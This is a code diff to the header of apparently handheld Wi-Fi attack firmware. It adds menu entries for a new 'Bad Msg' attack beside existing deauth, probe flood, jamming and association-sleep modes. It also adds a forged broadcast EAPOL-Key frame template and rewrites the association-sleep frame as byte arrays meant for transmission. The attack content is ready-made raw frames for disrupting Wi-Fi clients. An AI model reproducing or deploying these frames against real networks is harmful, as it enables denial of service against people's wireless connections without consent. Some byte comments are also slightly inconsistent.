@@ -17,9 +17,7 @@ enum class MenuType
     GAMES_CAROUSEL,
 
     // --- GAME LOBBY MENUS ---
-    SNAKE_MENU,
     SNAKE_GAME,
-    TETRIS_MENU,
 
     // --- Tools Sub-menus ---
     WIFI_TOOLS_GRID,
@@ -35,6 +33,7 @@ enum class MenuType
     DEAUTH_MODE_GRID,
     PROBE_FLOOD_MODE_GRID,
     ASSOCIATION_SLEEP_MODES_GRID,
+    BAD_MSG_MODES_GRID, // <-- ADD THIS
 
     // --- Core Attack/Tool Screens ---
     WIFI_LIST, // Re-used for multiple purposes
@@ -56,6 +55,7 @@ enum class MenuType
     DUCKY_SCRIPT_ACTIVE,
     JAMMING_ACTIVE,
     ASSOCIATION_SLEEP_ACTIVE,
+    BAD_MSG_ACTIVE, // <-- ADD THIS
 
     // --- Settings Sub-menus ---
     SETTINGS_GRID,
@@ -225,11 +225,66 @@ namespace RawFrames {
         namespace AssociationRequest {
             // A minimal frame for the association sleep attack
             static constexpr uint8_t TEMPLATE[30] = {
-                0x00, 0x00, 0x3a, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-                0x00, 0x00, 0x00, 0x00, 0x01, 0x04, 0x0a, 0x00, 0x00, 0x00      
+                0x00, 0x10, // Frame Control (Association Request) PM=1
+                0x3a, 0x01, // Duration
+                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+                0x00, 0x00,                         // Sequence Control
+                0x31, 0x00,                         // Capability Information (PM=1)
+                0x0a, 0x00,                         // Listen Interval
+                0x00,                               // SSID tag
+                0x00,                               // SSID length      
             };
         }
+
+        // --- NEW: Add the Bad Message EAPOL frame ---
+        namespace BadMsg {
+            static constexpr uint8_t EAPOL_TEMPLATE[153] = {
+                0x08, 0x02,                         // Frame Control (EAPOL)
+                0x00, 0x00,                         // Duration
+                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+                0x30, 0x00,                         // Sequence Control
+                /* LLC / SNAP */
+                0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00,
+                0x88, 0x8e,                          // Ethertype = EAPOL
+                /* -------- 802.1X Header -------- */
+                0x02,                               // Version 802.1X‑2004
+                0x03,                               // Type Key
+                0x00, 0x75,                          // Length 117 bytes
+                /* -------- EAPOL‑Key frame body (117 B) -------- */
+                0x02,                               // Desc Type 2 (AES/CCMP)
+                0x00, 0xCA,                          // Key Info (Install|Ack…)
+                0x00, 0x10,                          // Key Length = 16
+                /* Replay Counter (8) */
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
+                /* Nonce (32) */
+                0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+                0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
+                0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
+                0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
+                /* Key IV (16) */
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                /* Key RSC (8) */
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                /* Key ID  (8) */ 
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                /* Key MIC (16) */ 
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                /* Key Data Len (2) */ 
+                0x00, 0x16,
+                /* Key Data (22 B) */
+                0xDD, 0x14,                // Vendor‑specific (PMKID IE)
+                0x00, 0x0F, 0xAC, 0x04,      // OUI + Type (PMKID)
+                /* PMKID (16 byte zero) */
+                0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 
+                0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11
+            };
+        } // namespace BadMsg
     } // namespace Mgmt
 
     namespace Jamming {
@@ -253,6 +308,7 @@ namespace SD_ROOT
     static constexpr const char *WIFI_KNOWN_NETWORKS = "/config/wifi_known_networks.txt";
     static constexpr const char *CONFIG_CURRENT_FIRMWARE = "/config/current_firmware.json";
 
+    static constexpr const char *DATA_GAMES = "/data/games";
     static constexpr const char *DATA_LOGS = "/data/logs";
     static constexpr const char *DATA_CAPTURES = "/data/captures";
     static constexpr const char *DATA_PROBES = "/data/captures/probes";
